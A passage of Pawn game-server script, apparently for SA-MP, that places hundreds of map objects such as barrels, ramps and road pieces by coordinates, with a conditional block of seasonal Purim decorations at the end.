	CreateSObject(1225, -754.583191, 2523.088379, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -753.842834, 2520.895020, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -750.881958, 2518.924316, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -748.663086, 2521.004639, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -747.392273, 2521.683105, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -745.732117, 2524.158447, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -741.546082, 2521.254639, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -740.780334, 2517.508057, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -762.670654, 2524.152100, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -764.141479, 2522.593750, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -759.957947, 2519.643799, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -760.925964, 2517.048584, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -759.533325, 2516.216309, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -755.991638, 2515.753418, 137.334732, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -756.748779, 2519.078613, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -756.666199, 2523.941895, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -758.915344, 2527.505127, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -762.058899, 2526.643311, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -765.006592, 2526.848877, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -768.442200, 2526.776855, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -771.248230, 2527.281738, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -774.101196, 2527.251709, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -775.651184, 2525.556885, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -775.246704, 2521.107910, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -772.788391, 2521.601807, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -770.801514, 2519.879395, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -771.775696, 2517.439697, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -766.139282, 2518.474365, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -762.925842, 2519.775391, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -767.280579, 2523.134521, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -772.749207, 2525.458252, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -770.812866, 2525.206299, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -775.028259, 2523.584717, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -778.012695, 2525.220215, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -780.453735, 2524.506104, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -777.973328, 2522.131348, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -777.463684, 2519.427002, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -774.246033, 2519.248535, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -776.574219, 2518.199463, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -773.203064, 2523.575928, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -779.144958, 2517.693359, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -779.954468, 2514.551758, 137.576279, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -778.175293, 2514.483643, 137.946716, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -774.610840, 2514.405029, 137.946716, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -773.531372, 2514.133789, 137.946716, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -783.767029, 2514.551758, 137.681122, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -790.459595, 2514.634521, 137.346710, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -799.128235, 2514.551758, 137.781815, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -797.268066, 2517.280273, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -796.410156, 2520.263428, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -797.594849, 2525.171387, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -806.136230, 2520.473633, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -785.651855, 2526.365967, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -785.219666, 2524.729736, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -782.892395, 2525.881348, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -779.678711, 2527.207764, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -777.804504, 2527.310059, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -775.500610, 2527.433838, 137.486069, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -779.642151, 2522.241455, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -779.924194, 2519.035645, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -776.184753, 2523.125000, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -766.182312, 2521.897949, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -766.594421, 2515.615967, 137.346710, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -791.749634, 2524.594727, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -790.760376, 2522.483398, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -790.306580, 2520.465088, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -789.430359, 2518.093262, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -805.194214, 2515.726807, 137.346710, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -803.099487, 2516.963867, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -804.003967, 2523.240967, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -807.102478, 2524.457275, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -801.048584, 2519.541504, 137.144714, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -801.179932, 2526.923584, 137.346710, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -755.673950, 2518.262451, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -752.992798, 2519.772217, 137.132736, 0.0000, 0.0000, 0.0000);
	CreateSObject(13641, -908.673523, 2520.268066, 138.420059, 0.0000, 0.0000, 180.0000);
	CreateSObject(3269, -1063.018677, 2523.702393, 136.898087, 0.0000, 0.0000, 118.5933);
	CreateSObject(1634, -1200.281494, 2517.512939, 138.096283, 0.0000, 0.0000, 90.0000);
	CreateSObject(1634, -1200.314819, 2524.059082, 138.096283, 0.0000, 0.0000, 90.0000);
	CreateSObject(11547, -1386.612549, 2520.550293, 138.667786, 331.6386, 0.0000, 270.0000);
	CreateSObject(1632, -1787.297729, 2520.622314, 92.167236, 0.0000, 0.0000, 90.0000);
	CreateSObject(1632, -1787.314575, 2516.446289, 137.957855, 0.0000, 0.0000, 90.0000);
	CreateSObject(1632, -1787.316284, 2520.582275, 137.957855, 0.0000, 0.0000, 90.0000);
	CreateSObject(1632, -1787.338257, 2524.719482, 137.957855, 0.0000, 0.0000, 90.0000);
	CreateSObject(18450, -1889.434082, 2520.514160, 147.103241, 0.0000, 0.0000, 0.0000);
	CreateSObject(18449, -1967.824341, 2520.521729, 147.115158, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2045.991699, 2520.501465, 147.102142, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2167.844727, 2520.780762, 157.489090, 0.0000, 0.0000, 0.0000);
	CreateSObject(1632, -2080.588623, 2520.543701, 148.496063, 0.0000, 0.0000, 90.0000);
	CreateSObject(1632, -2080.596680, 2516.375000, 148.496063, 0.0000, 0.0000, 90.0000);
	CreateSObject(1632, -2080.654297, 2524.705322, 148.521057, 0.0000, 0.0000, 90.0000);
	CreateSObject(18450, -2246.788330, 2520.760254, 157.501740, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2326.413330, 2520.771973, 157.488785, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2404.791260, 2520.734131, 157.500763, 0.0000, 0.0000, 0.0000);
	CreateSObject(1634, -2442.540039, 2518.576172, 158.966873, 0.0000, 0.0000, 90.0000);
	CreateSObject(1634, -2442.508545, 2522.718750, 158.966873, 0.0000, 0.0000, 90.0000);
	CreateSObject(1634, -2449.246826, 2518.584717, 164.578842, 27.5020, 0.0000, 90.0000);
	CreateSObject(1634, -2449.268311, 2522.704346, 164.612442, 27.5020, 0.0000, 90.0000);
	CreateSObject(1634, -2451.896729, 2518.592041, 173.137085, 65.3172, 0.0000, 90.0000);
	CreateSObject(1634, -2451.893066, 2522.748047, 173.119171, 65.3172, 0.0000, 90.0000);
	CreateSObject(1634, -2450.195801, 2518.600830, 182.087601, 85.0842, 0.0000, 90.0000);
	CreateSObject(1634, -2450.199463, 2522.769531, 182.110519, 85.0842, 0.0000, 90.0000);
	CreateSObject(1634, -2449.125488, 2518.569824, 18.567415, 110.0079, 0.0000, 90.0000);
	CreateSObject(1634, -2448.880859, 2518.499023, 18.567415, 106.5702, 0.0000, 90.0000);
	CreateSObject(1634, -2444.386963, 2518.637207, 188.859589, 123.7589, 0.0000, 90.0000);
	CreateSObject(1634, -2444.381592, 2522.785645, 188.855530, 123.7590, 0.0000, 90.0000);
	CreateSObject(18450, -2376.187012, 2520.789551, 177.412949, 0.0000, 0.0000, 0.0000);
	CreateSObject(1655, 461.701843, 2517.522949, 20.239683, 359.1406, 0.0000, 270.0000);
	CreateSObject(1655, 468.003693, 2517.518799, 23.827169, 14.6104, 0.0000, 270.0000);
	CreateSObject(1655, 74.226959, 2475.460938, 16.529875, 0.0000, 0.0000, 270.0000);
	CreateSObject(1655, 81.107689, 2475.430664, 20.948656, 18.9076, 0.0000, 270.0000);
	CreateSObject(1655, 86.452896, 2475.396973, 27.643286, 37.8152, 0.0000, 270.0000);
	CreateSObject(1655, 88.893623, 2475.401611, 35.352386, 61.0200, 0.0000, 270.0000);
	CreateSObject(1655, 87.961380, 2475.370605, 43.890076, 85.0842, 0.0000, 270.0000);
	CreateSObject(1655, 84.256882, 2475.328369, 51.342514, 102.2730, 0.0000, 270.0000);
	CreateSObject(1655, 78.380554, 2475.320068, 57.133915, 122.8995, 0.0000, 270.0000);
	CreateSObject(18450, -2296.841064, 2520.772949, 177.424866, 0.0000, 0.0000, 0.0000);
	CreateSObject(1655, -2262.627686, 2520.652100, 178.843781, 0.0000, 0.0000, 270.0000);
	CreateSObject(1655, -2256.039063, 2520.627197, 183.105957, 18.9076, 0.0000, 270.0000);
	CreateSObject(1655, -2250.918213, 2520.641357, 189.004501, 34.3775, 0.0000, 270.0000);
	CreateSObject(1655, -2248.197266, 2520.619629, 196.954559, 60.1606, 0.0000, 270.0000);
	CreateSObject(1655, -2248.522217, 2520.626465, 205.698914, 78.2087, 0.0000, 270.0000);
	CreateSObject(1655, -2251.126465, 2520.643555, 1.351380, 100.5541, 0.0000, 270.0000);
	CreateSObject(1655, -2251.532471, 2520.595215, 213.635269, 97.1163, 0.0000, 270.0000);
	CreateSObject(1655, -2256.752441, 2520.773682, 1.295862, 110.8673, 0.0000, 270.0000);
	CreateSObject(1655, -2257.887207, 2520.631836, 219.825867, 127.1967, 0.0000, 270.0000);
	CreateSObject(18450, -2320.256348, 2520.571289, 206.336746, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2400.013428, 2520.583984, 206.374390, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2478.497803, 2520.554688, 206.361435, 0.0000, 0.0000, 0.0000);
	CreateSObject(1655, -2512.466064, 2520.621338, 207.805344, 0.0000, 0.0000, 90.0000);
	CreateSObject(1655, -73.624596, 2487.688232, 16.559490, 0.0000, 0.0000, 90.0000);
	CreateSObject(1655, -73.646210, 2496.428223, 16.584490, 0.0000, 0.0000, 90.0000);
	CreateSObject(1655, -73.631523, 2505.161621, 16.584490, 0.0000, 0.0000, 90.0000);
	CreateSObject(1655, -72.167717, 2480.534912, 16.559490, 0.0000, 0.0000, 112.5000);
	CreateSObject(1655, -68.081329, 2474.547607, 16.559490, 0.0000, 0.0000, 135.0000);
	CreateSObject(1655, -81.324272, 2505.151123, 20.741993, 12.0321, 0.0000, 90.0000);
	CreateSObject(1655, -81.319229, 2496.416504, 20.734476, 12.0321, 0.0000, 90.0000);
	CreateSObject(1655, -81.364082, 2487.706299, 20.746855, 12.0321, 0.0000, 90.0000);
	CreateSObject(18367, 101.686653, 2538.622070, 43.359764, 340.2330, 0.0000, 270.0000);
	CreateSObject(18367, 74.237106, 2538.612061, 56.840359, 337.6546, 0.0000, 270.0000);
	CreateSObject(18367, 47.154465, 2538.687500, 71.727333, 0.0000, 0.0000, 270.0000);
	CreateSObject(18367, 16.796524, 2538.616455, 75.128784, 344.5301, 0.0000, 270.0000);
	CreateSObject(18367, -11.899176, 2538.593750, 86.666924, 0.0000, 0.0000, 270.0000);
	CreateSObject(18367, -42.323898, 2538.572754, 90.076653, 0.0000, 0.0000, 270.0000);
	CreateSObject(18367, -72.989830, 2538.575928, 93.516357, 0.0000, 0.0000, 270.0000);
	CreateSObject(18367, -99.878288, 2539.104004, 96.386658, 0.0000, 357.4217, 236.2501);
	CreateSObject(18367, -103.506004, 2538.511475, 96.962494, 0.0000, 0.0000, 270.0000);
	CreateSObject(18367, -133.345901, 2561.947266, 99.134911, 0.0000, 0.0000, 236.2501);
	CreateSObject(18367, -158.850189, 2578.976318, 102.631790, 33.5180, 0.8594, 236.2501);
	CreateSObject(18367, -181.566528, 2594.161865, 88.606956, 30.0803, 0.8594, 236.2501);
	CreateSObject(1634, -201.974457, 2607.821289, 79.483490, 338.5141, 0.0000, 56.2500);
	CreateSObject(18367, -133.262650, 2538.638916, 100.388756, 348.8273, 0.0000, 270.0000);
	CreateSObject(18367, -159.902542, 2538.803711, 108.769012, 341.9518, 0.0000, 270.0000);
	CreateSObject(18367, -186.312164, 2538.862305, 120.716629, 336.7952, 0.0000, 270.0000);
	CreateSObject(1655, -2519.928467, 2520.631836, 212.052765, 13.7510, 0.0000, 90.0000);
	CreateSObject(1655, -2525.171875, 2520.653076, 218.172974, 39.5341, 0.0000, 90.0000);
	CreateSObject(1655, -2527.525146, 2520.662842, 226.108337, 61.8794, 0.0000, 90.0000);
	CreateSObject(1655, -2526.163574, 2520.668213, 234.650650, 88.5220, 0.0000, 90.0000);
	CreateSObject(1655, -2521.160400, 2520.652588, 241.507538, 116.8834, 0.0000, 90.0000);
	CreateSObject(18450, -2450.694580, 2520.575439, 240.073547, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2371.609619, 2520.565430, 240.059799, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2292.292969, 2520.558105, 240.046783, 0.0000, 0.0000, 0.0000);
	CreateSObject(1655, -2257.460449, 2520.415771, 241.465698, 0.0000, 0.0000, 270.0000);
	CreateSObject(1655, -2250.563232, 2520.415771, 245.868103, 18.9076, 0.0000, 270.0000);
	CreateSObject(1655, -2245.279785, 2520.368652, 252.446320, 37.8152, 0.0000, 270.0000);
	CreateSObject(1655, -2242.638916, 2520.340820, 260.231384, 58.4417, 0.0000, 270.0000);
	CreateSObject(1655, -2242.829834, 2520.331299, 268.645386, 78.2087, 0.0000, 270.0000);
	CreateSObject(1655, -2246.725342, 2520.301025, 276.231995, 108.2890, 0.0000, 270.0000);
	CreateSObject(18450, -2316.020996, 2520.529297, 271.133789, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2394.443848, 2520.533447, 271.145752, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2433.944092, 2520.551270, 271.182831, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2511.720459, 2520.556885, 271.194794, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2590.511475, 2520.566162, 271.206757, 0.0000, 0.0000, 0.0000);
	CreateSObject(1634, -2624.965088, 2517.333008, 272.622894, 0.0000, 0.0000, 90.0000);
	CreateSObject(1634, -2631.857178, 2517.352051, 277.648163, 20.6265, 0.0000, 90.0000);
	CreateSObject(1634, -2635.995850, 2517.382080, 30.502663, 41.2530, 0.0000, 90.0000);
	CreateSObject(1634, -2635.904541, 2517.381104, 284.792236, 48.1285, 0.0000, 90.0000);
	CreateSObject(1634, -2636.717285, 2517.398438, 292.845215, 68.7549, 0.0000, 90.0000);
	CreateSObject(1634, -2634.792236, 2517.412842, 299.546997, 90.2409, 0.0000, 90.0000);
	CreateSObject(1634, -2630.378662, 2517.430420, 304.344055, 128.9156, 0.0000, 90.0000);
	CreateSObject(18450, -2566.141113, 2520.409668, 296.118683, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2487.619873, 2520.371338, 296.080597, 0.0000, 0.0000, 0.0000);
	CreateSObject(13592, -2457.468262, 2520.767090, 306.070251, 0.0000, 0.8594, 2.6556);
	CreateSObject(18450, -2408.613281, 2520.359863, 296.092499, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2641.908691, 2528.162842, 296.130524, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2329.435547, 2520.366699, 296.079590, 0.0000, 0.0000, 0.0000);
	CreateSObject(1655, -2293.539307, 2520.259521, 297.498505, 0.0000, 0.0000, 270.0000);
	CreateSObject(1655, -2286.839355, 2520.253662, 301.560059, 16.3293, 0.0000, 270.0000);
	CreateSObject(1655, -2281.278809, 2520.244629, 307.603363, 32.6586, 0.0000, 270.0000);
	CreateSObject(1655, -2278.474609, 2520.225586, 314.005890, 52.4256, 0.0000, 270.0000);
	CreateSObject(1655, -2278.275146, 2520.195068, 322.552887, 78.2087, 0.0000, 270.0000);
	CreateSObject(1655, -2280.894043, 2520.198975, 329.978760, 94.5380, 0.0000, 270.0000);
	CreateSObject(1655, -2286.899170, 2520.195068, 336.031647, 127.1967, 0.0000, 270.0000);
	CreateSObject(18450, -2353.966309, 2520.246338, 329.091492, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2430.606934, 2520.242432, 329.078217, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2506.417480, 2528.029541, 311.740265, 0.0000, 334.2169, 0.0000);
	CreateSObject(18450, -2569.841797, 2521.192383, 301.155884, 270.6186, 0.8594, 180.8594);
	CreateSObject(18450, -2569.779297, 2520.897949, 315.868408, 89.3814, 0.0000, 0.0000);
	CreateSObject(18450, -2721.542236, 2528.148682, 296.117493, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2801.322021, 2528.150879, 296.129639, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2890.958008, 2527.941650, 273.266571, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2791.656494, 2527.995605, 250.853516, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2712.440674, 2527.994141, 250.865494, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2633.144531, 2528.016602, 30.102283, 0.8594, 16.3293, 0.0000);
	CreateSObject(18450, -2632.840820, 2527.995850, 246.102661, 0.0000, 6.8755, 0.0000);
	CreateSObject(18450, -2593.680420, 2527.732910, 25.800411, 0.0000, 26.6425, 0.0000);
	CreateSObject(18450, -2559.603760, 2527.996826, 219.787872, 0.0000, 32.6586, 0.0000);
	CreateSObject(18450, -2494.030029, 2528.000977, 174.197357, 0.0000, 36.9558, 0.0000);
	CreateSObject(18450, -2430.380859, 2527.985107, 132.340637, 0.0000, 29.2208, 0.0000);
	CreateSObject(18450, -2378.594482, 2527.995361, 117.103241, 0.0000, 10.3132, 0.0000);
	CreateSObject(18450, -2316.226563, 2528.026855, 112.912735, 0.0000, 0.0000, 0.0000);
	CreateSObject(18450, -2159.816406, 2511.852051, 115.824677, 0.0000, 0.0000, 270.0000);
	CreateSObject(1655, -2281.951660, 2527.999268, 114.331581, 0.0000, 0.0000, 270.0000);
	CreateSObject(1655, -2275.096680, 2528.009277, 118.212433, 13.7510, 0.0000, 270.0000);
	CreateSObject(18450, -2149.424561, 2511.883545, 118.736618, 31.7992, 0.0000, 270.0000);
	CreateSObject(18450, -2142.635254, 2511.868896, 126.219040, 61.8794, 0.0000, 270.0000);
	CreateSObject(18450, -2140.029297, 2511.918213, 136.094589, 90.2409, 0.0000, 270.0000);
	CreateSObject(18450, -2159.808594, 2436.144775, 115.836670, 0.0000, 0.0000, 90.0000);
	CreateSObject(18450, -2159.790039, 2357.619141, 115.848511, 0.0000, 0.0000, 270.0000);
	CreateSObject(18450, -2929.540039, 2527.960449, 311.953491, 0.0000, 91.1003, 0.0000);
	CreateSObject(18450, -2571.689697, 2528.024658, 301.632294, 0.0000, 352.2651, 0.0000);
	CreateSObject(18450, -2530.446289, 2527.989014, 307.755035, 0.0000, 347.1084, 0.0000);
	CreateSObject(18450, -2599.937988, 2528.062012, 298.610748, 0.0000, 353.9839, 0.0000);
	CreateSObject(973, -2470.216553, 2515.916504, 330.262177, 0.0000, 0.0000, 270.0000);
	CreateSObject(973, -2625.697998, 2523.416504, 272.390717, 0.0000, 0.0000, 270.0000);
	CreateSObject(18367, -213.145996, 2538.889893, 136.000824, 0.0000, 0.0000, 270.0000);
	CreateSObject(18367, -243.308350, 2538.912109, 139.378448, 0.0000, 0.0000, 270.0000);
	CreateSObject(18367, -273.690857, 2538.908447, 142.783127, 0.0000, 0.0000, 270.0000);
	CreateSObject(18367, -303.901245, 2538.843262, 146.166412, 0.0000, 0.0000, 270.0000);
	CreateSObject(18367, -334.078186, 2538.920410, 149.570541, 0.0000, 0.0000, 270.0000);
	CreateSObject(1634, -361.857086, 2538.982178, 153.532562, 0.0000, 0.0000, 90.0000);
	CreateSObject(1655, 207.965836, 2448.818359, 16.584490, 0.0000, 0.0000, 135.0000);
	CreateSObject(1655, 91.786713, 2345.281982, 19.140497, 0.0000, 0.0000, 90.0000);
	CreateSObject(18450, -2159.776855, 2212.008057, 115.847374, 0.0000, 0.0000, 270.0000);
	CreateSObject(18450, -2159.782715, 2137.038086, 115.859215, 0.0000, 0.0000, 270.0000);
	CreateSObject(18450, -2159.800537, 2060.083740, 115.846176, 0.0000, 0.0000, 270.0000);
	CreateSObject(18450, -2159.808105, 1969.107422, 115.833046, 0.0000, 0.0000, 270.0000);
	CreateSObject(18450, -2159.833496, 1902.936401, 115.794975, 0.0000, 0.0000, 270.0000);
	CreateSObject(18450, -2159.860352, 1826.880371, 115.806831, 0.0000, 0.0000, 270.0000);
	CreateSObject(18450, -2159.874512, 1749.456421, 115.793770, 0.0000, 0.0000, 270.0000);
	CreateSObject(18450, -2159.886963, 1670.833984, 115.805687, 0.0000, 0.0000, 270.0000);
	CreateSObject(18450, -2159.920410, 1591.864990, 115.767601, 0.0000, 0.0000, 270.0000);
	CreateSObject(18450, -2159.927979, 1513.726440, 115.779564, 0.0000, 0.0000, 270.0000);
	CreateSObject(18450, -2159.954346, 1435.026367, 106.291557, 0.0000, 13.7510, 270.0000);
	CreateSObject(18450, -2159.929199, 1361.991089, 97.489265, 0.0000, 0.0000, 270.0000);
	CreateSObject(1655, -2160.009766, 1327.495972, 98.908112, 0.0000, 0.0000, 180.0000);
	CreateSObject(1655, -2159.982910, 2323.075195, 117.267357, 0.0000, 0.0000, 180.0000);
	CreateSObject(13592, -2160.118896, 2015.612549, 126.010551, 0.0000, 0.0000, 272.5783);
	CreateSObject(1655, -2160.060791, 1826.476074, 117.250679, 0.0000, 0.0000, 180.0000);
	CreateSObject(3425, 467.856262, 2489.508545, 33.286503, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, 382.856293, 2530.266846, 17.154320, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 237.418228, 2516.017334, 16.025961, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 234.744858, 2523.983154, 16.143188, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 235.809525, 2521.118896, 16.100943, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 237.277557, 2521.932373, 16.111340, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 238.354523, 2519.642822, 16.077368, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 241.412476, 2520.498047, 15.659553, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 243.100952, 2524.417236, 16.142962, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 244.288528, 2518.210938, 16.053627, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 246.096222, 2516.858154, 16.034267, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 249.476532, 2519.758545, 15.648930, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 252.002930, 2519.510498, 15.645539, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 253.271378, 2517.014160, 15.609665, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 226.825470, 2514.676025, 16.016218, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 231.143951, 2515.595215, 16.025558, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 234.326965, 2514.176758, 16.002234, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 239.656754, 2515.499756, 15.589106, 0.0000, 0.0000, 0.0000);
	// Purim Objects (Mr_oMeR):
	#if purim_now == true
	CreateSObject(8620, 2884.805176, -1772.251587, 39.033829, 0.0000, 0.0000, 262.0242,object_show_distance,0,world_purim);
	CreateSObject(14413, 2829.630615, -1787.721558, 15.916992, 0.0000, 0.0000, 347.9679,object_show_distance,0,world_purim);
	CreateSObject(10023, 2984.012695, -1789.859497, 24.689463, 0.0000, 0.0000, 261.1648,object_show_distance,0,world_purim);
	CreateSObject(8417, 2963.614502, -1786.450195, 16.241972, 0.0000, 180.3777, 353.1245,object_show_distance,0,world_purim);
	CreateSObject(4565, 2882.731689, -1771.349731, 11.820396, 0.0000, 0.0000, 258.5865,object_show_distance,0,world_purim);
	CreateSObject(16779, 2882.064941, -1771.871338, 22.212234, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(13667, 2988.304688, -1791.215210, 32.295296, 0.0000, 0.0000, 180.3775,object_show_distance,0,world_purim);
	CreateSObject(9833, 2864.373779, -1768.435425, 13.644430, 0.0000, 0.0000, 341.9518,object_show_distance,0,world_purim);
	CreateSObject(8492, 2882.497803, -1771.464966, 27.096237, 0.0000, 0.0000, 227.7509,object_show_distance,0,world_purim);
	CreateSObject(3877, 2878.665527, -1771.207520, 18.603325, 0.0000, 0.0000, 72.1926,object_show_distance,0,world_purim);
	CreateSObject(3374, 2970.349121, -1812.091431, 17.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2970.342529, -1812.168213, 20.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2970.428711, -1812.169312, 23.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2970.289307, -1812.136963, 26.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2970.979980, -1808.129395, 17.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2971.216797, -1806.178345, 17.894201, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2970.521973, -1812.132813, 29.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2971.008789, -1809.174438, 29.932541, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2971.390625, -1807.043701, 29.883728, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2971.473389, -1806.489380, 27.598877, 0.0000, 272.3375, 261.1648,object_show_distance,0,world_purim);
	CreateSObject(3374, 2972.434814, -1798.192139, 17.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2972.451904, -1798.184937, 20.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2972.455078, -1798.132690, 23.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2972.519043, -1798.109375, 26.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2972.294189, -1798.089355, 29.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2972.587158, -1796.443604, 29.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2972.944336, -1795.150146, 29.873005, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
